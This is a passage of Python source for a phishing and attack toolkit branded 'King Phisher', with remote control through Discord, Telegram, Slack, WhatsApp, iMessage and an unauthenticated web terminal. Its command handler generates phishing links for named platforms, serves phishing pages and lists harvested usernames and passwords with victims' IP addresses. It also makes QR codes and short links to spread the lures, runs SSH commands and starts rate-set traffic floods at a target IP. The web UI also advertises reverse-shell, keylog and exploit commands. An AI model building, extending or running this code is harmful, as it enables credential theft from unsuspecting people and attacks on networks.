    def generate_qr_code(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        return None
    def shorten_url(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        return NetworkTools.shorten_url(url)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                session_id = self.db.create_session(str(message.author.name), "discord")
                result = self.handler.execute(cmd, session_id, 'discord', str(message.author))
                if session_id:
                    self.db.update_session_activity(session_id)
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="👑 King Phisher Response", description=f"```{output}```",
                                     color=0xff8c00)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    def _run(self):
        try:
            self.bot.run(self.config['token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'api_id': '', 'api_hash': '', 'bot_token': ''}
    def save_config(self, api_id: str = "", api_hash: str = "", bot_token: str = "", enabled: bool = True) -> bool:
        try:
            config = {'enabled': enabled, 'api_id': api_id, 'api_hash': api_hash, 'bot_token': bot_token}
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        self.client = TelegramClient('kingphisher_session', self.config['api_id'], self.config['api_hash'])
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                sender = str(event.sender_id)
                session_id = self.db.create_session(sender, "telegram")
                result = self.handler.execute(cmd, session_id, 'telegram', sender)
                if session_id:
                    self.db.update_session_activity(session_id)
                output = result.get('output', '')[:4000]
                await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_", parse_mode='markdown')
        return True
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('bot_token'))
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
        self.last_ts = {}
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(SLACK_CONFIG_FILE):
                with open(SLACK_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(SLACK_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                sender = msg.get('user', 'unknown')
                                session_id = self.db.create_session(sender, "slack")
                                result = self.handler.execute(cmd, session_id, 'slack', sender)
                                if session_id:
                                    self.db.update_session_activity(session_id)
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '/'}
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    def setup(self) -> bool:
        if not SELENIUM_AVAILABLE:
            return False
        if not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        return True
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + WHATSAPP_SESSION_DIR)
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            self.running = True
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")
    def send_message(self, phone: str, message: str):
        if not self.driver:
            return False
        try:
            url = f"https://web.whatsapp.com/send?phone={phone}&text={urllib.parse.quote(message)}"
            self.driver.get(url)
            time.sleep(2)
            from selenium.webdriver.common.keys import Keys
            send_button = self.driver.find_element(By.XPATH, '//div[@contenteditable="true"]')
            send_button.send_keys(Keys.ENTER)
            return True
        except:
            return False

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(IMESSAGE_CONFIG_FILE):
                with open(IMESSAGE_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    def save_config(self, phone_numbers: List[str] = None, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers or [], 'prefix': prefix}
            with open(IMESSAGE_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    def setup(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            return False
        return True
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    def send_message(self, phone: str, message: str):
        try:
            script = f'tell application "Messages" to send "{message}" to buddy "{phone}"'
            subprocess.run(['osascript', '-e', script], timeout=10)
            return True
        except:
            return False

# =====================
# WEB SERVER (Flask with Terminal UI)
# =====================
if FLASK_AVAILABLE:
    class WebServer:
        def __init__(self, handler, db: DatabaseManager, port: int = 8080):
            self.handler = handler
            self.db = db
            self.port = port
            self.app = None
            self.running = False
            self.sessions = {}
        
        def start(self):
            if not FLASK_AVAILABLE:
                print(f"{Colors.WARNING}⚠️ Flask not available. Install with: pip install flask flask-cors{Colors.RESET}")
                return False
            
            self.app = Flask(__name__)
            CORS(self.app)
            
            # HTML Terminal UI
            terminal_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>KING PHISHER | SECURITY TERMINAL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c); min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Fira Code', 'JetBrains Mono', 'Cascadia Code', monospace; padding: 1.5rem; }
        .phish-terminal { width: 100%; max-width: 1300px; height: 85vh; min-height: 600px; background: #0B0E17; border-radius: 2rem; box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(255, 165, 0, 0.2), 0 0 0 5px rgba(75, 0, 130, 0.1); display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(2px); }
        .terminal-header { background: linear-gradient(95deg, #0F1322, #070b14); padding: 0.9rem 1.8rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #ff8c00; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
        .brand { display: flex; align-items: baseline; gap: 0.5rem; flex-wrap: wrap; }
        .king { font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg, #FFB347, #FF7E05); -webkit-background-clip: text; background-clip: text; color: transparent; text-shadow: 0 0 8px rgba(255, 125, 0, 0.4); letter-spacing: 1px; }
        .phisher { font-size: 1.8rem; font-weight: 700; background: linear-gradient(135deg, #a855f7, #7c3aed); -webkit-background-clip: text; background-clip: text; color: transparent; text-shadow: 0 0 6px #a855f780; }
        .badge { background: #ffcc0044; border: 1px solid #ffcc00; color: #ffdd66; border-radius: 60px; padding: 0.2rem 0.75rem; font-size: 0.7rem; font-weight: bold; letter-spacing: 1px; backdrop-filter: blur(4px); }
        .status-led { display: flex; gap: 1rem; align-items: center; }
        .led { width: 12px; height: 12px; border-radius: 50%; background-color: #22c55e; box-shadow: 0 0 8px #22ff88; animation: pulse 1.5s infinite; }
        .led.orange { background-color: #ff8c00; box-shadow: 0 0 8px orange; }
        .status-text { font-family: monospace; font-size: 0.8rem; color: #a0a8d0; }
        @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.9); } 100% { opacity: 1; transform: scale(1.2); } }
        .terminal-output { flex: 1; background: #05070e; overflow-y: auto; padding: 1.2rem 1.5rem; display: flex; flex-direction: column; gap: 0.6rem; font-size: 0.95rem; font-weight: 500; scroll-behavior: smooth; border-bottom: 1px solid #2a2f3f; }
        .terminal-output::-webkit-scrollbar { width: 8px; }
        .terminal-output::-webkit-scrollbar-track { background: #1a1e2a; }
        .terminal-output::-webkit-scrollbar-thumb { background: #ff8c00; border-radius: 10px; }
        .command-line { display: flex; flex-wrap: wrap; gap: 0.6rem; align-items: baseline; font-family: monospace; border-left: 3px solid #ff9800; padding-left: 0.8rem; margin: 0.2rem 0; }
        .prompt { color: #f0b34b; font-weight: bold; text-shadow: 0 0 2px #ffa500; }
        .cmd-text { color: #cbd5ff; word-break: break-all; }
        .output-block { background: #0c1020aa; border-left: 3px solid #7c3aed; margin-left: 1rem; padding: 0.6rem 1rem; font-family: monospace; color: #c0ccf0; border-radius: 0 10px 10px 0; font-size: 0.9rem; white-space: pre-wrap; word-break: break-word; }
        .error-output { border-left-color: #ff4444; background: #2a0f1faa; color: #ffb3b3; }
        .warning-output { border-left-color: #ffaa33; background: #2a2210aa; }
        .terminal-input-area { background: #0c1022; padding: 1rem 1.5rem 1.4rem; border-top: 1px solid #ff8c0033; display: flex; gap: 0.7rem; align-items: flex-start; flex-wrap: wrap; }
        .input-wrapper { flex: 1; display: flex; align-items: center; background: #01040e; border-radius: 60px; border: 1px solid #ff8000; padding: 0.2rem 1rem; transition: all 0.2s; box-shadow: 0 0 6px rgba(255, 100, 0, 0.3); }
        .input-wrapper:focus-within { border-color: #b85eff; box-shadow: 0 0 12px #aa66ff; }
        .prompt-symbol { color: #ffaa44; font-size: 1.2rem; font-weight: bold; margin-right: 10px; font-family: monospace; }
        #commandInput { background: transparent; border: none; outline: none; color: #f0f3ff; font-family: 'Fira Code', monospace; font-size: 1rem; padding: 0.8rem 0; width: 100%; caret-color: #ffa500; }
        #commandInput::placeholder { color: #4a5070; font-style: italic; }
        .btn-terminal { background: linear-gradient(145deg, #1e1f36, #0b0d1a); border: 1px solid #ff9626; color: #ffbc6e; font-weight: bold; font-family: monospace; padding: 0.6rem 1.2rem; border-radius: 40px; cursor: pointer; transition: all 0.2s; font-size: 0.9rem; box-shadow: 0 2px 6px black; }
        .btn-terminal:hover { background: #ff8c22; color: #0a0c1a; border-color: #ffdd99; box-shadow: 0 0 12px #ff9f4a; transform: scale(0.97); }
        .help-row { display: flex; gap: 12px; font-size: 0.7rem; color: #6d7eb0; padding: 0 0.6rem; align-items: center; }
    </style>
</head>
<body>
<div class="phish-terminal">
    <div class="terminal-header">
        <div class="brand"><span class="king">KING</span><span class="phisher">PHISHER</span><span class="badge">⚡ SECURITY TERMINAL v3.0</span></div>
        <div class="status-led"><div class="led"></div><div class="led orange"></div><span class="status-text">[ ACTIVE | PHISHING SUITE ]</span></div>
    </div>
    <div class="terminal-output" id="terminalOutput">
        <div class="command-line"><span class="prompt">KING_PHISHER@terminal:~$</span><span class="cmd-text">system --welcome</span></div>
        <div class="output-block">⚡ <span style="color:#ffae42;">King Phisher Terminal</span> — advanced security command interface.<br>🧬 Available commands: <span style="color:#bc9eff;">help, scan, exploit, harvest, phishing-gen, clear, status, reverse-shell, keylog, netview, session-kill, custom</span><br>🎨 Theme: BLUE | ORANGE | PURPLE | YELLOW — power ready.<br>💡 Type <span style="color:#ffcc44;">help</span> to see full command list + examples.</div>
        <div class="output-block" style="border-left-color: #3b82f6;">🔥 System ready. Use terminal like CMD / bash. Security mode ACTIVE.</div>
    </div>
    <div class="terminal-input-area">
        <div class="input-wrapper"><span class="prompt-symbol">❯❯</span><input type="text" id="commandInput" placeholder="enter security command ... (e.g., scan --target 192.168.1.1)" autocomplete="off" spellcheck="false"></div>
        <button class="btn-terminal" id="executeBtn">⚡ EXECUTE</button>
        <div class="help-row"><span>⬆️/⬇️ history</span><span>🔐 KingPhisher CLI</span></div>
    </div>
</div>
<script>
    const outputDiv = document.getElementById('terminalOutput');
    const commandInput = document.getElementById('commandInput');
    const executeBtn = document.getElementById('executeBtn');
    let history = [];
    let historyIndex = -1;
    let sessionId = 'web_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
    
    function scrollToBottom() { outputDiv.scrollTop = outputDiv.scrollHeight; }
    
    function appendCommandLine(cmd) {
        const cmdLineDiv = document.createElement('div');
        cmdLineDiv.className = 'command-line';
        cmdLineDiv.innerHTML = `<span class="prompt">KING_PHISHER@phish:~$</span><span class="cmd-text">${escapeHtml(cmd)}</span>`;
        outputDiv.appendChild(cmdLineDiv);
        scrollToBottom();
    }
    
    function appendOutput(text, type = 'default') {
        const outBlock = document.createElement('div');
        outBlock.className = 'output-block';
        if (type === 'error') outBlock.classList.add('error-output');
        if (type === 'warning') outBlock.classList.add('warning-output');
        outBlock.innerHTML = parseAnsiLike(text);
        outputDiv.appendChild(outBlock);
        scrollToBottom();
    }
    
    function parseAnsiLike(str) {
        let processed = str.replace(/\[BLUE\](.*?)\[\/BLUE\]/gi, '<span style="color:#3b82f6;">$1</span>');
        processed = processed.replace(/\[ORANGE\](.*?)\[\/ORANGE\]/gi, '<span style="color:#ff9800;">$1</span>');
        processed = processed.replace(/\[PURPLE\](.*?)\[\/PURPLE\]/gi, '<span style="color:#c084fc;">$1</span>');
        processed = processed.replace(/\[YELLOW\](.*?)\[\/YELLOW\]/gi, '<span style="color:#facc15;">$1</span>');
        processed = processed.replace(/\[GREEN\](.*?)\[\/GREEN\]/gi, '<span style="color:#4ade80;">$1</span>');
        processed = processed.replace(/\[RED\](.*?)\[\/RED\]/gi, '<span style="color:#f87171;">$1</span>');
        processed = processed.replace(/`(.*?)`/g, '<span style="background:#0e142a; padding:0 4px; border-radius:6px; color:#ffbc6e;">$1</span>');
        return processed;
    }
    
    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    async function executeCommand(cmd) {
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd, session_id: sessionId })
            });
            const result = await response.json();
            if (result.success) {
                let output = result.output || '';
                if (typeof output === 'object') output = JSON.stringify(output, null, 2);
                if (output) appendOutput(output);
                else appendOutput('[GREEN]✅ Command executed successfully[/GREEN]');
            } else {
                appendOutput(`[RED]❌ Error: ${result.output || 'Unknown error'}[/RED]`, 'error');
            }
        } catch (error) {
            appendOutput(`[RED]❌ Connection error: ${error.message}[/RED]`, 'error');
        }
    }
    
    function processCommand(cmd) {
        if (cmd.trim() === "") return;
        if (history.length === 0 || history[history.length-1] !== cmd) history.push(cmd);
        historyIndex = history.length;
        appendCommandLine(cmd);
        if (cmd.toLowerCase() === 'clear') {
            while (outputDiv.firstChild) outputDiv.removeChild(outputDiv.firstChild);
            appendOutput('[PURPLE]🧹 Terminal cleared. King Phisher ready.[/PURPLE]');
            commandInput.value = "";
            return;
        }
        executeCommand(cmd);
        commandInput.value = "";
    }
    
    commandInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') { e.preventDefault(); processCommand(commandInput.value); }
        else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (history.length > 0 && historyIndex > 0) { historyIndex--; commandInput.value = history[historyIndex]; commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length); }
            else if (historyIndex === -1 && history.length) { historyIndex = history.length-1; commandInput.value = history[historyIndex]; }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (history.length && historyIndex < history.length-1) { historyIndex++; commandInput.value = history[historyIndex]; }
            else if (historyIndex === history.length-1) { historyIndex = history.length; commandInput.value = ""; }
            else if (!history.length) commandInput.value = "";
        }
    });
    
    executeBtn.addEventListener('click', () => { processCommand(commandInput.value); });
    commandInput.focus();
    setInterval(async () => {
        try { await fetch('/api/health'); } catch(e) {}
    }, 30000);
</script>
</body>
</html>'''
            
            @self.app.route('/')
            def index():
                return render_template_string(terminal_html)
            
            @self.app.route('/api/command', methods=['POST'])
            def api_command():
                data = request.get_json()
                command = data.get('command', '')
                session_id = data.get('session_id', 'web')
                result = self.handler.execute(command, session_id, 'web', 'web_user')
                return jsonify(result)
            
            @self.app.route('/api/health', methods=['GET'])
            def health():
                return jsonify({'status': 'healthy', 'timestamp': datetime.datetime.now().isoformat()})
            
            @self.app.route('/api/stats', methods=['GET'])
            def stats():
                stats = self.db.get_statistics()
                return jsonify(stats)
            
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web server started on http://{NetworkTools.get_local_ip()}:{self.port}{Colors.RESET}")
            print(f"{Colors.SUCCESS}   Open your browser to access the King Phisher terminal{Colors.RESET}")
            return True
        
        def _run(self):
            try:
                self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
            except Exception as e:
                logger.error(f"Web server error: {e}")
        
        def stop(self):
            self.running = False
else:
    class WebServer:
        def __init__(self, handler, db, port=8080):
            pass
        def start(self):
            print(f"{Colors.WARNING}⚠️ Flask not available. Web server disabled.{Colors.RESET}")
            return False
        def stop(self):
            pass

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
    
    def execute(self, command: str, session_id: str = None, source: str = "local", sender: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        cmd = parts[0].lower()
        args = parts[1:]
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        if session_id:
            self.db.log_command(session_id, command, source, source, result.get('success', False),
                               str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        # Time commands
        if cmd == 'time':
            now = datetime.datetime.now()
            return {'success': True, 'output': f"🕐 {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}"}
        elif cmd == 'date':
            now = datetime.datetime.now()
            return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}"}
        elif cmd == 'datetime':
            now = datetime.datetime.now()
            return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}\n🕐 {now.strftime('%H:%M:%S')}"}
        elif cmd == 'help':
            return self._execute_help()
        
        # SSH commands
        elif cmd == 'ssh_add':
            if len(args) < 3:
                return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password] [port]'}
            return self.ssh.add_server(args[0], args[1], args[2], args[3] if len(args) > 3 else None,
                                       None, int(args[4]) if len(args) > 4 else 22) if self.ssh else {'success': False, 'output': 'SSH manager not initialized'}
        elif cmd == 'ssh_list':
            servers = self.ssh.get_servers() if self.ssh else []
            if not servers:
                return {'success': True, 'output': 'No SSH servers configured'}
            output = "🔌 SSH Servers:\n"
            for s in servers:
                status = "🟢" if s.get('connected') else "⚪"
                output += f"{status} {s['name']} - {s['host']}:{s['port']} ({s['username']})\n"
            return {'success': True, 'output': output}
        elif cmd == 'ssh_connect':
            if not args:
                return {'success': False, 'output': 'Usage: ssh_connect <server_id>'}
            return self.ssh.connect(args[0]) if self.ssh else {'success': False, 'output': 'SSH manager not initialized'}
        elif cmd == 'ssh_exec':
            if len(args) < 2:
                return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
            result = self.ssh.execute_command(args[0], ' '.join(args[1:])) if self.ssh else None
            if result:
                return {'success': result.success, 'output': result.output if result.success else result.error}
            return {'success': False, 'output': 'SSH manager not initialized'}
        elif cmd == 'ssh_disconnect':
            if self.ssh:
                self.ssh.disconnect(args[0] if args else None)
                return {'success': True, 'output': 'Disconnected'}
            return {'success': False, 'output': 'SSH manager not initialized'}
        
        # Traffic generation commands
        elif cmd == 'generate_traffic':
            if not self.traffic_gen:
                return {'success': False, 'output': 'Traffic generator not initialized'}
            if len(args) < 3:
                return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port] [rate]'}
            traffic_type = args[0].lower()
            target_ip = args[1]
            try:
                duration = int(args[2])
            except:
                return {'success': False, 'output': f'Invalid duration: {args[2]}'}
            port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
            rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
            try:
                generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, rate)
                return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        elif cmd == 'traffic_types':
            if self.traffic_gen:
                types = self.traffic_gen.get_available_traffic_types()
                return {'success': True, 'output': "📡 Available Traffic Types:\n" + "\n".join([f"  • {t}" for t in types])}
            return {'success': False, 'output': 'Traffic generator not initialized'}
        elif cmd == 'traffic_status':
            if self.traffic_gen:
                active = self.traffic_gen.get_active_generators()
                if not active:
                    return {'success': True, 'output': 'No active traffic generators'}
                output = "🚀 Active Traffic Generators:\n"
                for g in active:
                    output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
                return {'success': True, 'output': output}
            return {'success': False, 'output': 'Traffic generator not initialized'}
        elif cmd == 'traffic_stop':
            if self.traffic_gen:
                generator_id = args[0] if args else None
                if self.traffic_gen.stop_generation(generator_id):
                    return {'success': True, 'output': 'Traffic stopped' + (f' for {generator_id}' if generator_id else ' for all')}
                return {'success': False, 'output': 'Failed to stop traffic'}
            return {'success': False, 'output': 'Traffic generator not initialized'}
        
        # Nikto commands
        elif cmd == 'nikto':
            return self.nikto.scan(args[0]) if args else {'success': False, 'output': 'Usage: nikto <target>'}
        elif cmd == 'nikto_full':
            return self.nikto.scan(args[0], {'tuning': '123456789'}) if args else {'success': False, 'output': 'Usage: nikto_full <target>'}
        elif cmd == 'nikto_ssl':
            return self.nikto.scan(args[0], {'ssl': True}) if args else {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        elif cmd == 'nikto_status':
            status = self.nikto.nikto_available if self.nikto else False
            return {'success': True, 'output': f"🕷️ Nikto Scanner Status\n  Available: {'✅' if status else '❌'}"}
        
        # Phishing commands
        elif cmd.startswith('phish_'):
            platform = cmd.replace('phish_', '')
            result = self.social_tools.generate_phishing_link(platform)
            if result['success']:
                return {'success': True, 'output': f"🎣 Phishing link generated for {platform}\nLink ID: {result['link_id']}\nURL: {result['phishing_url']}\n\nUse: phishing_start_server {result['link_id']} to start the server"}
            return {'success': False, 'output': result.get('error', 'Failed to generate link')}
        elif cmd == 'phishing_start_server':
            if len(args) < 1:
                return {'success': False, 'output': 'Usage: phishing_start_server <link_id> [port]'}
            port = int(args[1]) if len(args) > 1 else 8080
            if self.social_tools.start_phishing_server(args[0], port):
                url = self.social_tools.get_server_url()
                return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
            return {'success': False, 'output': f'Failed to start server for link {args[0]}'}
        elif cmd == 'phishing_stop_server':
            self.social_tools.stop_phishing_server()
            return {'success': True, 'output': 'Phishing server stopped'}
        elif cmd == 'phishing_status':
            running = self.social_tools.phishing_server.running
            url = self.social_tools.get_server_url() if running else None
            output = f"🎣 Phishing Server Status: {'✅ Running' if running else '❌ Stopped'}"
            if running:
                output += f"\n   URL: {url}"
            return {'success': True, 'output': output}
        elif cmd == 'phishing_links':
            links = self.social_tools.get_active_links()
            all_links = self.db.get_phishing_links()
            output = f"🎣 Phishing Links ({len(all_links)} total)\n"
            for l in all_links[:10]:
                active = '🟢' if any(al['link_id'] == l['id'] for al in links) else '⚪'
                output += f"  {active} {l['id'][:8]} - {l['platform']} ({l['clicks']} clicks)\n"
            return {'success': True, 'output': output}
        elif cmd == 'phishing_credentials':
            link_id = args[0] if args else None
            creds = self.social_tools.get_captured_credentials(link_id)
            if not creds:
                return {'success': True, 'output': 'No credentials captured'}
            output = f"📧 Captured Credentials ({len(creds)}):\n"
            for c in creds[:10]:
                output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
            return {'success': True, 'output': output}
        elif cmd == 'phishing_qr':
            if not args:
                return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
            qr_path = self.social_tools.generate_qr_code(args[0])
            if qr_path:
                return {'success': True, 'output': f"QR Code generated: {qr_path}"}
            return {'success': False, 'output': f'Failed to generate QR code for {args[0]}'}
        elif cmd == 'phishing_shorten':
            if not args:
                return {'success': False, 'output': 'Usage: phishing_shorten <link_id>'}
            short_url = self.social_tools.shorten_url(args[0])
            if short_url:
                return {'success': True, 'output': f"Shortened URL: {short_url}"}
            return {'success': False, 'output': f'Failed to shorten URL for {args[0]}'}
        
        # IP Management commands
        elif cmd == 'add_ip':
            if not args:
                return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
            ip = args[0]
            notes = ' '.join(args[1:]) if len(args) > 1 else ''
            try:
                ipaddress.ip_address(ip)
                if self.db.add_managed_ip(ip, 'cli', notes):
                    return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
                return {'success': False, 'output': f'Failed to add IP {ip}'}
            except ValueError:
                return {'success': False, 'output': f'Invalid IP: {ip}'}
        elif cmd == 'remove_ip':
            if not args:
                return {'success': False, 'output': 'Usage: remove_ip <ip>'}
            if self.db.remove_managed_ip(args[0]):
                return {'success': True, 'output': f'✅ IP {args[0]} removed'}
